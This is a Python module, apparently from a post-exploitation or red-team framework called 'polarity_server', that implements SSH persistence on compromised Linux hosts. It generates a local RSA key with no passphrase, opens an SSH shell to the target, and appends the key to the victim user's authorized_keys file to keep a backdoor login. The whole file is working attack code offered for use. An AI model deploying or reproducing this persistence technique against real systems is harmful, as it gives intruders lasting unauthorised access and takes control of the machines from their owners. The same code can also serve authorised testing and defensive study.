import logging
import os
import shutil
import subprocess

from polarity_server.persistence.base import BasePersistence
from polarity_server.shell_deployment import SSHShell


class SSHPersistence(BasePersistence):

    OS_FAMILY = ["Linux"]
    PORT = 22

    def install(self):
        SSHPersistence.__generate_ssh_key()

        if self._host.os_info.os_family in self.OS_FAMILY:
            ssh_copy_id = shutil.which("ssh-copy-id")

            if not ssh_copy_id:
                return False

            home_dir = os.environ["HOME"]
            pub_key = "{}/.ssh/id_rsa.pub".format(home_dir)

            with open(pub_key, "r") as pub_key_file:
                pub_key_data = pub_key_file.read()

            if not pub_key_data:
                return False

            ssh_shell = SSHShell(self._host, self._user)
            if not ssh_shell.create_connection():
                return False

            command = "mkdir -p /home/{}/.ssh".format(self._user.username)
            ssh_shell.send_command(command)

            command = ("echo \"{}\" >> /home/{}/.ssh/authorized_keys"
                       .format(pub_key_data, self._user.username))
            ssh_shell.send_command(command)

            ssh_shell.close_connection()

            logging.info("Installed SSH persistence on {}@{}"
                         .format(self._user.username, self._host.ip_address))

            return True
        else:
            return False

    @staticmethod
    def __generate_ssh_key():
        home_dir = os.environ["HOME"]
        ssh_path = "{}/.ssh/id_rsa".format(home_dir)
        if not os.path.isfile(ssh_path):
            logging.info("Generating SSH key")
            command = [
                "ssh-keygen",
                "-f",
                ssh_path,
                "-t",
                "rsa",
                "-N",
                "",
            ]
            subprocess.Popen(command)
